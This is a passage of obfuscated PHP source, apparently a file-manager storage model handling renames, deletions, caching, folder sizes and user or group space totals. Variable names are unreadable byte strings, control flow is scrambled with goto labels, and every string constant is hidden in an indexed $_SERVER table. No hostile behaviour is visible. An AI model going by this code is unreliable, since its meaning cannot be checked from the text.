$A©²ºÅÚÛô); return !0; goto EàõÖš– ; Fãë…·âÉ­: $a‰¡ßœ‰óì =& $_SERVER[±á õÁ]; $c‹ä·Š¹¬ö = $_SERVER[$a‰¡ßœ‰óì[12]] . $a‰¡ßœ‰óì[13]; $AğÊİ¹á³¡ = $a‰¡ßœ‰óì[1329]; goto A¤éô áƒŞ; DŠö‰Ô¦Ã: Hook::trigger($a‰¡ßœ‰óì[1902], $E‹µ÷ì’¹›, $A©²ºÅÚÛô); if ($A©²ºÅÚÛô) { Model($a‰¡ßœ‰óì[1901])->moveToRecycle($A‚çâô×µ); } else { $e£ŒÂ†œ§ù = $this->childrenAll($dÄ´ ˆà¹); Model($a‰¡ßœ‰óì[530])->eventRemove($A‚çâô×µ); $this->removeRelevance($e£ŒÂ†œ§ù[$a‰¡ßœ‰óì[1900]], $e£ŒÂ†œ§ù[$a‰¡ßœ‰óì[1279]]); } $this->folderSizeReset($dÄ´ ˆà¹[$a‰¡ßœ‰óì[486]]); goto c¢ÇœµÏ™Ñ; E’»í²í†: if (!$dÄ´ ˆà¹) { return !0; } if ($dÄ´ ˆà¹[$a‰¡ßœ‰óì[486]] == 0) { if (!_get($GLOBALS, $a‰¡ßœ‰óì[482])) { return !1; } } $this->lockMoveStart($A‚çâô×µ); goto DŠö‰Ô¦Ã; EàõÖš– : } public function childrenAll($Fœ‰‡Ó˜ÓÕ) { $aİ¨¢‚¦Îô =& $_SERVER[±á õÁ]; $d±„í„Û¦ = $Fœ‰‡Ó˜ÓÕ[$aİ¨¢‚¦Îô[393]]; if ($Fœ‰‡Ó˜ÓÕ[$aİ¨¢‚¦Îô[394]] == $aİ¨¢‚¦Îô[93]) { $aâË®‹Œ˜× = array($aİ¨¢‚¦Îô[550] => array($aİ¨¢‚¦Îô[508], $Fœ‰‡Ó˜ÓÕ[$aİ¨¢‚¦Îô[484]] . $d±„í„Û¦ . $aİ¨¢‚¦Îô[509])); $bÖÑ—¶é = array($aİ¨¢‚¦Îô[550] => $aâË®‹Œ˜×[$aİ¨¢‚¦Îô[484]]); $Bä’Ã¼òî» = $this->field($aİ¨¢‚¦Îô[1903])->where($bÖÑ—¶é)->select(); $f‘ª³›÷ƒ = !1; $AšØº”Úö¤ = array($d±„í„Û¦); if ($Bä’Ã¼òî») { $f‘ª³›÷ƒ = array_to_keyvalue($Bä’Ã¼òî», $aİ¨¢‚¦Îô[43], $aİ¨¢‚¦Îô[443]); $f‘ª³›÷ƒ = array_remove_value($f‘ª³›÷ƒ, $aİ¨¢‚¦Îô[493]); $AšØº”Úö¤ = array_to_keyvalue($Bä’Ã¼òî», $aİ¨¢‚¦Îô[43], $aİ¨¢‚¦Îô[393]); $AšØº”Úö¤[] = $d±„í„Û¦; } } else { $f‘ª³›÷ƒ = array($Fœ‰‡Ó˜ÓÕ[$aİ¨¢‚¦Îô[443]]); $AšØº”Úö¤ = array($d±„í„Û¦); } return array($aİ¨¢‚¦Îô[1900] => $AšØº”Úö¤, $aİ¨¢‚¦Îô[1279] => $f‘ª³›÷ƒ); } public function removeArray($CÙ¨¤¤Êæö) { if (!$CÙ¨¤¤Êæö) { return !0; } } public function removeRelevance($C”¶±Ôöõ‚, $EÂÈ¸ÉŠ¾Ÿ) { goto eå•Íù©Üä; c»°¢Ÿ†™ë: $C”¶±Ôöõ‚ = array_unique(array_filter($C”¶±Ôöõ‚)); $EÂÈ¸ÉŠ¾Ÿ = array_unique(array_filter($EÂÈ¸ÉŠ¾Ÿ)); if (!$C”¶±Ôöõ‚) { return !1; } goto F»İ¶º¥”; F»İ¶º¥”: $D½¨À†Çˆ… = array($F´µéíÃòÖ[407] => array($F´µéíÃòÖ[408], $C”¶±Ôöõ‚)); Model($F´µéíÃòÖ[1901])->where($D½¨À†Çˆ…)->delete(); Model($F´µéíÃòÖ[437])->where($D½¨À†Çˆ…)->delete(); goto B„ô÷Éå; cì·äÌçî’: for ($fˆìòø¤òñ = 0; $fˆìòø¤òñ < count($C”¶±Ôöõ‚); $fˆìòø¤òñ++) { $this->sourceCacheClear($C”¶±Ôöõ‚[$fˆìòø¤òñ]); } goto ešÛì¯¤Æ; eå•Íù©Üä: $F´µéíÃòÖ =& $_SERVER[±á õÁ]; $C”¶±Ôöõ‚ = $C”¶±Ôöõ‚ ? $C”¶±Ôöõ‚ : array(); $EÂÈ¸ÉŠ¾Ÿ = $EÂÈ¸ÉŠ¾Ÿ ? $EÂÈ¸ÉŠ¾Ÿ : array(); goto c»°¢Ÿ†™ë; E˜òô›¶§‡: Model($F´µéíÃòÖ[1882])->removeBySource($C”¶±Ôöõ‚); $this->where($D½¨À†Çˆ…)->delete(); Model($F´µéíÃòÖ[446])->remove($EÂÈ¸ÉŠ¾Ÿ); goto cì·äÌçî’; B„ô÷Éå: Model($F´µéíÃòÖ[1753])->where($D½¨À†Çˆ…)->delete(); Model($F´µéíÃòÖ[530])->where($D½¨À†Çˆ…)->delete(); Model($F´µéíÃòÖ[1598])->removeBySource($C”¶±Ôöõ‚); goto E˜òô›¶§‡; ešÛì¯¤Æ: } public function rename($Aò¿Á—øŠ, $AÂ­´¥²º) { goto b¹È¦¦™Å; b¹È¦¦™Å: $aæä¤©˜ê¶ =& $_SERVER[±á õÁ]; $AÜ¾«°–É² = $this->sourceInfo($Aò¿Á—øŠ); if (!$AÜ¾«°–É²) { return !1; } goto FšñÕ…Î…í; fÎˆìêö: $this->setNamePinyin($Aò¿Á—øŠ, $FÆÓê«Àâ¡[$aæä¤©˜ê¶[38]], !1); $this->updateModifyTime($AÜ¾«°–É²[$aæä¤©˜ê¶[486]]); $eÂ†ğØÌ­ = $this->where(array($aæä¤©˜ê¶[407] => $Aò¿Á—øŠ))->data($FÆÓê«Àâ¡)->save(); goto aò‚°®¬£; b—ÊØ÷á¥Î: if (!$AÜ¾«°–É²[$aæä¤©˜ê¶[394]] == $aæä¤©˜ê¶[93]) { $FÆÓê«Àâ¡[$aæä¤©˜ê¶[396]] = get_path_ext($AÂ­´¥²º); } Model($aæä¤©˜ê¶[530])->eventRename($Aò¿Á—øŠ, $AÜ¾«°–É²[$aæä¤©˜ê¶[38]], $AÂ­´¥²º); $this->sourceCacheClear($Aò¿Á—øŠ); goto fÎˆìêö; FšñÕ…Î…í: $AÅ«ä•Êñê = $this->fileNameExist($AÜ¾«°–É²[$aæä¤©˜ê¶[486]], $AÂ­´¥²º); if ($AÅ«ä•Êñê && $AÅ«ä•Êñê != $Aò¿Á—øŠ) { return !1; } $FÆÓê«Àâ¡ = array($aæä¤©˜ê¶[410] => $AÂ­´¥²º, $aæä¤©˜ê¶[549] => USER_ID); goto b—ÊØ÷á¥Î; aò‚°®¬£: $f¯öğ’ò£Ú = $aæä¤©˜ê¶[1890] . $AÜ¾«°–É²[$aæä¤©˜ê¶[486]]; if (isset(self::$cacheChildList[$f¯öğ’ò£Ú])) { unset(self::$cacheChildList[$f¯öğ’ò£Ú]); } return $eÂ†ğØÌ­; goto AŒ®†»Î; AŒ®†»Î: } public function setNamePinyin($C ®æì‡İé, $CÜ ÍÛ‘ˆ, $eÇ¸Öèíˆ† = true) { $f£Ì¯„Ğöç =& $_SERVER[±á õÁ]; $CÆ¦ù²…×õ = Input::check($CÜ ÍÛ‘ˆ, $f£Ì¯„Ğöç[553]); if ($eÇ¸Öèíˆ† && !$CÆ¦ù²…×õ) { return; } if (!$CÆ¦ù²…×õ) { $this->metaSet($C ®æì‡İé, $f£Ì¯„Ğöç[440], null); $this->metaSet($C ®æì‡İé, $f£Ì¯„Ğöç[439], null); return; } $B™‹Ä¨Ôº = array($f£Ì¯„Ğöç[440] => str_replace($f£Ì¯„Ğöç[60], $f£Ì¯„Ğöç[43], Pinyin::encode($CÜ ÍÛ‘ˆ)), $f£Ì¯„Ğöç[439] => Pinyin::encode($CÜ ÍÛ‘ˆ, $f£Ì¯„Ğöç[554])); $this->metaSet($C ®æì‡İé, $B™‹Ä¨Ôº); } public function getContent($f¯ÆÙ°÷ñİ) { goto Aõæ‚‘İÀó; cƒö²òã¹: if (!$bÏàÍ‹ˆÎŠ[$eò¾î„Ë…ç[85]]) { return $eò¾î„Ë…ç[43]; } return IO::getContent($bÏàÍ‹ˆÎŠ[$eò¾î„Ë…ç[85]]); goto bçèÊíëç; Aõæ‚‘İÀó: $eò¾î„Ë…ç =& $_SERVER[±á õÁ]; $bÏàÍ‹ˆÎŠ = $this->fileInfoGet($f¯ÆÙ°÷ñİ); if (!$bÏàÍ‹ˆÎŠ) { return !1; } goto b·­Ëô¸™ñ; b·­Ëô¸™ñ: if ($bÏàÍ‹ˆÎŠ[$eò¾î„Ë…ç[87]] == 0) { return $eò¾î„Ë…ç[43]; } $f¡’÷˜•Ñó = $eò¾î„Ë…ç[1904] . $bÏàÍ‹ˆÎŠ[$eò¾î„Ë…ç[177]]; if ($bÏàÍ‹ˆÎŠ[$eò¾î„Ë…ç[87]] <= 1024 * 10) { $bø­•î‹× = Cache::get($f¡’÷˜•Ñó); if (!$bø­•î‹×) { $bø­•î‹× = IO::getContent($bÏàÍ‹ˆÎŠ[$eò¾î„Ë…ç[85]]); Cache::set($f¡’÷˜•Ñó, $bø­•î‹×); } return $bø­•î‹×; } goto cƒö²òã¹; bçèÊíëç: } public function setDesc($dÌä–óöß˜, $Eñ¢’×ùÆ) { $EâÖ¬‰Äùé =& $_SERVER[±á õÁ]; Model($EâÖ¬‰Äùé[530])->eventAddDesc($dÌä–óöß˜, $Eñ¢’×ùÆ); return $this->metaSet($dÌä–óöß˜, $EâÖ¬‰Äùé[429], $Eñ¢’×ùÆ); } public function setContent($D½¾ãì¶µÚ, $E¡Ó–â£œ¢ = '') { goto b¸…µ³–à; DÎ™‡¡­¨‹: if (!$aòàçÇùÉŞ) { return Model($EùÊÅãœ‘[446])->remove($f°Ë›¹£‡í[$EùÊÅãœ‘[443]]); } $this->folderSizeReset($A´»»Ë›¾[$EùÊÅãœ‘[486]]); return !0; goto Eö¥»œ¬É; b¸…µ³–à: $EùÊÅãœ‘ =& $_SERVER[±á õÁ]; $A´»»Ë›¾ = $this->sourceInfo($D½¾ãì¶µÚ); $FÓ¾™ÄèÎß = $this->fileInfoGet($D½¾ãì¶µÚ); goto e˜‰â²×‘é; e˜‰â²×‘é: if (!$FÓ¾™ÄèÎß || !$A´»»Ë›¾) { return !1; } $f°Ë›¹£‡í = Model($EùÊÅãœ‘[446])->addFileByContent($E¡Ó–â£œ¢, $A´»»Ë›¾[$EùÊÅãœ‘[38]]); $aòàçÇùÉŞ = $this->fileHistory($A´»»Ë›¾, $f°Ë›¹£‡í[$EùÊÅãœ‘[443]], $f°Ë›¹£‡í[$EùÊÅãœ‘[87]]); goto DÎ™‡¡­¨‹; Eö¥»œ¬É: } public function fileSubstr($d‘²°©’©ß, $b¥áÚºùëÙ, $F¯Ç®‹Şô) { $A®ÉÓÆ¯Üò = $this->fileInfoGet($d‘²°©’©ß); if (!$A®ÉÓÆ¯Üò) { return !1; } return IO::fileSubstr($A®ÉÓÆ¯Üò[$_SERVER[±á õÁ][85]], $b¥áÚºùëÙ, $F¯Ç®‹Şô); } public function fileInfoGet($b§­ ‰êŠñ) { goto Cö³õ¼Øé÷; C½¶®Ëëœ: $Fçö‰…ç¤ = $DëĞŠäÆÑá[449] . $c§¥¸¯îİ[$DëĞŠäÆÑá[443]]; $f…Ğ®ˆë³í = _get(self::$cacheFileInfo, $Fçö‰…ç¤); if ($f…Ğ®ˆë³í) { return $f…Ğ®ˆë³í; } goto B‘”ß£™¯“; B‘”ß£™¯“: $eÀÚéíãïà = Model($DëĞŠäÆÑá[446])->fileInfo($c§¥¸¯îİ[$DëĞŠäÆÑá[443]]); if ($eÀÚéíãïà) { $eÀÚéíãïà[$DëĞŠäÆÑá[38]] = $c§¥¸¯îİ[$DëĞŠäÆÑá[38]]; } self::$cacheFileInfo[$Fçö‰…ç¤] = $eÀÚéíãïà; goto dàŠÜäçÂÃ; Cö³õ¼Øé÷: $DëĞŠäÆÑá =& $_SERVER[±á õÁ]; $c§¥¸¯îİ = $this->sourceInfo($b§­ ‰êŠñ); if (!$c§¥¸¯îİ || $c§¥¸¯îİ[$DëĞŠäÆÑá[394]]) { return !1; } goto C½¶®Ëëœ; dàŠÜäçÂÃ: return $eÀÚéíãïà; goto E÷­›•Ã¿; E÷­›•Ã¿: } private function folderChildrenNumber($fÜ·£òˆõë) { $fïÆ·¼™•Å =& $_SERVER[±á õÁ]; $f÷Ş±†Ñ¯Ã = $this->sourceInfo($fÜ·£òˆõë); $CÎŞó½µ… = array($fïÆ·¼™•Å[550] => array($fïÆ·¼™•Å[508], $f÷Ş±†Ñ¯Ã[$fïÆ·¼™•Å[484]] . $fÜ·£òˆõë . $fïÆ·¼™•Å[509]), $fïÆ·¼™•Å[420] => intval($f÷Ş±†Ñ¯Ã[$fïÆ·¼™•Å[421]]), $fïÆ·¼™•Å[543] => 1); $DÓ‡…å…Å¸ = $this->where($CÎŞó½µ…)->count(); $Aêœá¸âÃ¾ = $this->where($CÎŞó½µ…)->where(array($fïÆ·¼™•Å[543] => 0))->count(); return array($fïÆ·¼™•Å[91] => $Aêœá¸âÃ¾, $fïÆ·¼™•Å[92] => $DÓ‡…å…Å¸); } public function pathInfo($bÉ¯Ÿ„µ ­, $DÅõŞÈãÁ• = false) { goto Cíô»¬Ş™; f‚šŞ„Ÿƒø: self::$cachePathInfo[$DÀËƒŒÏÂ] = $bæåø„ÏŞ‰; return $bæåø„ÏŞ‰; goto Dâçß¢´Ò; b¥íøÜíÆÖ: $DÀËƒŒÏÂ = $bšò †°ó[435] . intval($DÅõŞÈãÁ•) . $bšò †°ó[436] . $bÉ¯Ÿ„µ ­; $F•©Ó±÷Îô = _get(self::$cachePathInfo, $DÀËƒŒÏÂ); if ($F•©Ó±÷Îô) { return $F•©Ó±÷Îô; } goto d×á‡äÂØÉ; d×á‡äÂØÉ: $bæåø„ÏŞ‰ = $this->sourceInfo($bÉ¯Ÿ„µ ­); if (!$bæåø„ÏŞ‰) { return !1; } $bæåø„ÏŞ‰ = $this->_listDataApplyItem($bæåø„ÏŞ‰, $DÅõŞÈãÁ•); goto f‚šŞ„Ÿƒø; Cíô»¬Ş™: $bšò †°ó =& $_SERVER[±á õÁ]; $DÅõŞÈãÁ• = !1; $bÉ¯Ÿ„µ ­ = intval($bÉ¯Ÿ„µ ­); goto b¥íøÜíÆÖ; Dâçß¢´Ò: } public static $cachePathInfoMore = array(); public function pathInfoMore($Aâáˆß„Ìİ) { goto BŠòÄ›»ĞË; Fœ‘ÄÀ­»‰: $A¡õ²Œ‡äğ = $this->pathInfo($Aâáˆß„Ìİ); if (!$A¡õ²Œ‡äğ) { return !1; } if ($A¡õ²Œ‡äğ[$b”—Ÿ¶ä[394]] == $b”—Ÿ¶ä[93]) { $A¡õ²Œ‡äğ[$b”—Ÿ¶ä[90]] = $this->folderChildrenNumber($Aâáˆß„Ìİ); } goto b¬‚¥´Èîù; BŠòÄ›»ĞË: $b”—Ÿ¶ä =& $_SERVER[±á õÁ]; $Dç‡Ş¿İ¬­ = _get(self::$cachePathInfoMore, $Aâáˆß„Ìİ); if ($Dç‡Ş¿İ¬­) { return $Dç‡Ş¿İ¬­; } goto Fœ‘ÄÀ­»‰; b¬‚¥´Èîù: self::$cachePathInfoMore[$Aâáˆß„Ìİ] = $A¡õ²Œ‡äğ; return $A¡õ²Œ‡äğ; goto F›é ¹ëà‹; F›é ¹ëà‹: } public function sourceInfo($A·›‰‚¥ƒÈ) { goto cã«ƒç°¶±; cã«ƒç°¶±: $B¦Ì¿–ñÚø =& $_SERVER[±á õÁ]; if (!$A·›‰‚¥ƒÈ) { return array(); } $A·›‰‚¥ƒÈ = intval($A·›‰‚¥ƒÈ); goto bÎˆìõ£×‘; bÎˆìõ£×‘: $Eêó‘°éæˆ = $B¦Ì¿–ñÚø[434] . $A·›‰‚¥ƒÈ; $BÔª¸‚ÁˆŠ = _get(self::$cacheSourceInfo, $Eêó‘°éæˆ); if ($BÔª¸‚ÁˆŠ) { return $BÔª¸‚ÁˆŠ; } goto eƒâ½Õõ°; eƒâ½Õõ°: $Dãò÷µ‡…¹ = $this->where(array($B¦Ì¿–ñÚø[393] => $A·›‰‚¥ƒÈ))->find(); self::$cacheSourceInfo[$Eêó‘°éæˆ] = $Dãò÷µ‡…¹; return self::$cacheSourceInfo[$Eêó‘°éæˆ]; goto C¶–²Æ›°Ì; C¶–²Æ›°Ì: } public function sourceCacheClear($B÷í›§ÜÚ  = false) { if ($B÷í›§ÜÚ  == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[±á õÁ][434] . $B÷í›§ÜÚ ]); } public function pathInfoByPath($FŠŒÆê˜¯ì, $b‚Òì³ïÆğ) { $D«¿Ş…å®Ó =& $_SERVER[±á õÁ]; $a•ÃÆš„ÎÀ = !$b‚Òì³ïÆğ ? array() : explode($D«¿Ş…å®Ó[8], trim($b‚Òì³ïÆğ, $D«¿Ş…å®Ó[8])); $E“†•÷Ì‚Ê = $FŠŒÆê˜¯ì; foreach ($a•ÃÆš„ÎÀ as $f¦†¨¸ƒ×») { $DÍ˜Ï¡¥İ = array($D«¿Ş…å®Ó[486] => $E“†•÷Ì‚Ê, $D«¿Ş…å®Ó[38] => $f¦†¨¸ƒ×»); $eœİÔ÷õ”÷ = $this->where($DÍ˜Ï¡¥İ)->select(); if (!$eœİÔ÷õ”÷) { return !1; } $eœİÔ÷õ”÷ = array_sort_by($eœİÔ÷õ”÷, $D«¿Ş…å®Ó[421]); $E“†•÷Ì‚Ê = $eœİÔ÷õ”÷[0][$D«¿Ş…å®Ó[393]]; } return $this->pathInfo($E“†•÷Ì‚Ê, !0); } protected function updateModifyTime($DÌçëÜ£¥…) { goto Aª•À¥¤¿; a‘õí©“µ: $this->where($EíãÇ®ìè´)->save($AÆ„ÏôŠ); goto b¨ìœò–¿Ü; Aª•À¥¤¿: $c¿¤ŒÛë =& $_SERVER[±á õÁ]; if (!$DÌçëÜ£¥…) { return; } if (!is_array($DÌçëÜ£¥…)) { $DÌçëÜ£¥… = array($DÌçëÜ£¥…); } goto eòÄùªæÁ; eòÄùªæÁ: foreach ($DÌçëÜ£¥… as $Có™ÒŸõæ‡ => $bµÑÅ²’ ä) { $DÌçëÜ£¥…[$Có™ÒŸõæ‡] = intval($bµÑÅ²’ ä); } $EíãÇ®ìè´ = array($c¿¤ŒÛë[393] => array($c¿¤ŒÛë[7], $DÌçëÜ£¥…)); $AÆ„ÏôŠ = array($c¿¤ŒÛë[549] => USER_ID, $c¿¤ŒÛë[414] => time()); goto a‘õí©“µ; b¨ìœò–¿Ü: } public function folderSizeReset($b»š„ğß‚) { goto D•±›½ Ìì; C¸æ²Õµ‘©: $EËÒåµ…µĞ = array($aÉçñÆ‹›±[392] => $b»š„ğß‚, $aÉçñÆ‹›±[420] => 0); $fÇŸóñçÀÂ = $this->where($EËÒåµ…µĞ)->sum($aÉçñÆ‹›±[87]); $fÇŸóñçÀÂ = intval($fÇŸóñçÀÂ); goto b±ìÜ³Ÿƒ; fÙÊ¥ùŒ½: $f±ÀåŒŠÏ“ = $this->parentLevelArray($B„ï§ÑöÈ‘[$aÉçñÆ‹›±[484]]); if ($f±ÀåŒŠÏ“) { $EËÒåµ…µĞ = array($aÉçñÆ‹›±[393] => array($aÉçñÆ‹›±[408], $f±ÀåŒŠÏ“)); if ($fïŒ—ë÷· < 0) { $EËÒåµ…µĞ[$aÉçñÆ‹›±[87]] = array($aÉçñÆ‹›±[945], abs($fïŒ—ë÷·)); } $this->where($EËÒåµ…µĞ)->setAdd($aÉçñÆ‹›±[87], $fïŒ—ë÷·); } $this->targetSpaceUpdate($B„ï§ÑöÈ‘[$aÉçñÆ‹›±[395]], $B„ï§ÑöÈ‘[$aÉçñÆ‹›±[481]]); goto fİ¡ôå; fİ¡ôå: CacheLock::unlock($b¢‹Ê¤¬¡Ô); goto FÌÛ¸Ç„Œ¶; b±ìÜ³Ÿƒ: $fïŒ—ë÷· = $fÇŸóñçÀÂ - intval($B„ï§ÑöÈ‘[$aÉçñÆ‹›±[87]]); if ($fïŒ—ë÷· == 0) { return CacheLock::unlock($b¢‹Ê¤¬¡Ô); } $this->where(array($aÉçñÆ‹›±[407] => $b»š„ğß‚))->setField($aÉçñÆ‹›±[87], $fÇŸóñçÀÂ); goto fÙÊ¥ùŒ½; aˆÉ‰È·Ãª: CacheLock::lock($b¢‹Ê¤¬¡Ô, 20); $this->sourceCacheClear($b»š„ğß‚); $B„ï§ÑöÈ‘ = $this->sourceInfo($b»š„ğß‚); goto C¸æ²Õµ‘©; D•±›½ Ìì: $aÉçñÆ‹›± =& $_SERVER[±á õÁ]; if ($this->statusIgnoreResetSpace) { return; } $b¢‹Ê¤¬¡Ô = $aÉçñÆ‹›±[1905] . $b»š„ğß‚; goto aˆÉ‰È·Ãª; FÌÛ¸Ç„Œ¶: } public function folderSizeResetChildren($DÎ•ÖŸÇ‘) { goto Fã¤‚ªˆù“; B§«¹²æŞ: foreach ($e‰¿Ê‰Ã†š as $eª­Ò¸®») { $BÚŒòõ‡œË = $eª­Ò¸®»[$cïÜÊ–Œ·”[486]] . $cïÜÊ–Œ·”[43]; if (!isset($eâ¹­ßªó[$BÚŒòõ‡œË])) { continue; } if ($eª­Ò¸®»[$cïÜÊ–Œ·”[421]] == $eâ¹­ßªó[$BÚŒòõ‡œË][$cïÜÊ–Œ·”[421]]) { $eâ¹­ßªó[$BÚŒòõ‡œË][$cïÜÊ–Œ·”[87]] += $eª­Ò¸®»[$cïÜÊ–Œ·”[87]]; } } foreach ($eâ¹­ßªó as $eª­Ò¸®») { $D™ÄÂ¾‚° = $this->parentLevelArray($eª­Ò¸®»[$cïÜÊ–Œ·”[484]]); foreach ($D™ÄÂ¾‚° as $BÚŒòõ‡œË) { $BÚŒòõ‡œË = $BÚŒòõ‡œË . $cïÜÊ–Œ·”[43]; if (!isset($eâ¹­ßªó[$BÚŒòõ‡œË])) { continue; } if ($eª­Ò¸®»[$cïÜÊ–Œ·”[421]] == $eâ¹­ßªó[$BÚŒòõ‡œË][$cïÜÊ–Œ·”[421]]) { $eâ¹­ßªó[$BÚŒòõ‡œË][$cïÜÊ–Œ·”[87]] += $eª­Ò¸®»[$cïÜÊ–Œ·”[87]]; } } } $c¶ËÚ—á½£ = array(); goto d™¢Ì‚“•; d™¢Ì‚“•: foreach ($eâ¹­ßªó as $eª­Ò¸®») { if ($eª­Ò¸®»[$cïÜÊ–Œ·”[87]] == $eª­Ò¸®»[$cïÜÊ–Œ·”[1907]]) { continue; } $c¶ËÚ—á½£[] = array($cïÜÊ–Œ·”[393], $eª­Ò¸®»[$cïÜÊ–Œ·”[393]], $cïÜÊ–Œ·”[87], $eª­Ò¸®»[$cïÜÊ–Œ·”[87]]); } $this->saveAll($c¶ËÚ—á½£); goto dƒÆÏ…êó·; AÇ¬©Û‘¤: $eâ¹­ßªó[] = $cÃÏêË½ïº; $eâ¹­ßªó = array_to_keyvalue($eâ¹­ßªó, $cïÜÊ–Œ·”[393]); foreach ($eâ¹­ßªó as $E˜¢¦²ª• => $eª­Ò¸®») { $eâ¹­ßªó[$E˜¢¦²ª•][$cïÜÊ–Œ·”[1907]] = $eâ¹­ßªó[$E˜¢¦²ª•][$cïÜÊ–Œ·”[87]]; $eâ¹­ßªó[$E˜¢¦²ª•][$cïÜÊ–Œ·”[87]] = 0; } goto B§«¹²æŞ; F·é£ñÂ¨Ç: $d¥¬ÑŠØã[$cïÜÊ–Œ·”[394]] = 0; $e‰¿Ê‰Ã†š = $this->field($FÓÆ Î»‹)->where($d¥¬ÑŠØã)->select(); if (!$e‰¿Ê‰Ã†š) { return; } goto AÇ¬©Û‘¤; A¸¯Õ· é: $d¥¬ÑŠØã = array($cïÜÊ–Œ·”[543] => 1, $cïÜÊ–Œ·”[550] => array($cïÜÊ–Œ·”[508], $cÃÏêË½ïº[$cïÜÊ–Œ·”[484]] . $DÎ•ÖŸÇ‘ . $cïÜÊ–Œ·”[509])); $FÓÆ Î»‹ = $cïÜÊ–Œ·”[1906]; $eâ¹­ßªó = $this->field($FÓÆ Î»‹)->where($d¥¬ÑŠØã)->select(); goto F·é£ñÂ¨Ç; Fã¤‚ªˆù“: $cïÜÊ–Œ·” =& $_SERVER[±á õÁ]; $this->sourceCacheClear($DÎ•ÖŸÇ‘); $cÃÏêË½ïº = $this->sourceInfo($DÎ•ÖŸÇ‘); goto A¸¯Õ· é; dƒÆÏ…êó·: } public function userSpaceReset($aÀ£Ù¹‡ß = false) { $cîê¿ÌÉ«š =& $_SERVER[±á õÁ]; $fõ—ÅÏàÍ¥ = $this->where(array($cîê¿ÌÉ«š[395] => self::TYPE_USER, $cîê¿ÌÉ«š[481] => $aÀ£Ù¹‡ß, $cîê¿ÌÉ«š[394] => 0))->sum($cîê¿ÌÉ«š[87]); Model($cîê¿ÌÉ«š[499])->userEdit($aÀ£Ù¹‡ß, array($cîê¿ÌÉ«š[1607] => $fõ—ÅÏàÍ¥)); } public function targetSpaceUpdate($B÷ÔÒƒÛÔÜ, $f´Ö‡èÕ) { $Dàê›˜Ê‡Ë =& $_SERVER[±á õÁ]; if (!$f´Ö‡èÕ) { return; } if (!in_array($B÷ÔÒƒÛÔÜ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $D¶èº¸ìÂÖ = $this->targetSpaceSize($B÷ÔÒƒÛÔÜ, $f´Ö‡èÕ); if ($B÷ÔÒƒÛÔÜ == self::TYPE_USER) { Model($Dàê›˜Ê‡Ë[499])->userEdit($f´Ö‡èÕ, array($Dàê›˜Ê‡Ë[1607] => $D¶èº¸ìÂÖ)); } else { if ($B÷ÔÒƒÛÔÜ == self::TYPE_GROUP) { Model($Dàê›˜Ê‡Ë[483])->groupEdit($f´Ö‡èÕ, array($Dàê›˜Ê‡Ë[1607] => $D¶èº¸ìÂÖ)); } } } public function targetSpaceSize($d¨»œæŸîŠ, $Cù¶Î½£ÎÄ) { goto a„ˆ„¥Ô±œ; a„ˆ„¥Ô±œ: $Bè¹åÊâô‡ =& $_SERVER[±á õÁ]; $EÍÓİ˜ˆÄ = $this->sourceRoot($d¨»œæŸîŠ, $Cù¶Î½£ÎÄ, !0); if (!$EÍÓİ˜ˆÄ) { return 0; } goto fÉ†¸†µäÑ; E¯ññÙš¡ê: $AÊŠ¥è‚É‹ = array_to_keyvalue($AÊŠ¥è‚É‹, $Bè¹åÊâô‡[43], $Bè¹åÊâô‡[393]); $AÊŠ¥è‚É‹ = array_unique(array_filter($AÊŠ¥è‚É‹)); if ($AÊŠ¥è‚É‹) { $B±’–§œ÷· = array($Bè¹åÊâô‡[407] => array($Bè¹åÊâô‡[408], $AÊŠ¥è‚É‹)); $cÕĞ§æÄÃ += floatval($this->where($B±’–§œ÷·)->sum($Bè¹åÊâô‡[87])); } goto B¦òùŸâäò; fÉ†¸†µäÑ: $cÕĞ§æÄÃ = floatval($EÍÓİ˜ˆÄ[$Bè¹åÊâô‡[87]]); $B±’–§œ÷· = array($Bè¹åÊâô‡[550] => array($Bè¹åÊâô‡[508], $Bè¹åÊâô‡[495] . $EÍÓİ˜ˆÄ[$Bè¹åÊâô‡[393]] . $Bè¹åÊâô‡[509])); $AÊŠ¥è‚É‹ = Model($Bè¹åÊâô‡[419])->field($Bè¹åÊâô‡[407])->where($B±’–§œ÷·)->select(); goto E¯ññÙš¡ê; B¦òùŸâäò: return $cÕĞ§æÄÃ; goto a…ÛÊ˜¸î‡; a…ÛÊ˜¸î‡: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($eŸ¾ÂÖå°) { return $this->fileTypeProfile($eŸ¾ÂÖå°, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eéóø¿¶›ˆ) { return $this->fileTypeProfile($eéóø¿¶›ˆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($FÃÑ£Ã³È, $BÖÔ§Ú¨ø„) { goto bÌìò…ñ£; e™¬’¶º“’: $e‡åµÂâ†Á = array(); $e‡åµÂâ†Á[$E¡Áïæ²ê­[1909]] = array($E¡Áïæ²ê­[1910] => LNG($E¡Áïæ²ê­[1909]), $E¡Áïæ²ê­[1911] => $this->where($D»Î±Ğ¿…·)->count(), $E¡Áïæ²ê­[545] => $this->where($D»Î±Ğ¿…·)->sum($E¡Áïæ²ê­[87])); $E„ªé¯“ÑÕ = KodIO::fileTypeList(); goto CêÉ—ŞœÍã; CêÉ—ŞœÍã: foreach ($E„ªé¯“ÑÕ as $b£Ä©¶°† => $B‹‘ˆøˆ) { $D»Î±Ğ¿…·[$E¡Áïæ²ê­[396]] = $this->fileTypeWhere($b£Ä©¶°†); $e‡åµÂâ†Á[$b£Ä©¶°†] = array($E¡Áïæ²ê­[1910] => $B‹‘ˆøˆ[$E¡Áïæ²ê­[38]], $E¡Áïæ²ê­[1911] => $this->where($D»Î±Ğ¿…·)->count(), $E¡Áïæ²ê­[545] => $this->where($D»Î±Ğ¿…·)->sum($E¡Áïæ²ê­[87])); } Cache::set($aĞ–Œ¥ç•, $e‡åµÂâ†Á, 1200); return $e‡åµÂâ†Á; goto EŸ¼¼ïïœ›; bÌìò…ñ£: $E¡Áïæ²ê­ =& $_SERVER[±á õÁ]; $aĞ–Œ¥ç• = $E¡Áïæ²ê­[1908] . $FÃÑ£Ã³È . $E¡Áïæ²ê­[80] . $BÖÔ§Ú¨ø„; $E½ÚëÊÅÌã = Cache::get($aĞ–Œ¥ç•); goto b®ŒŸ‘‘§; b®ŒŸ‘‘§: if ($E½ÚëÊÅÌã) { return $E½ÚëÊÅÌã; } $D»Î±Ğ¿…· = 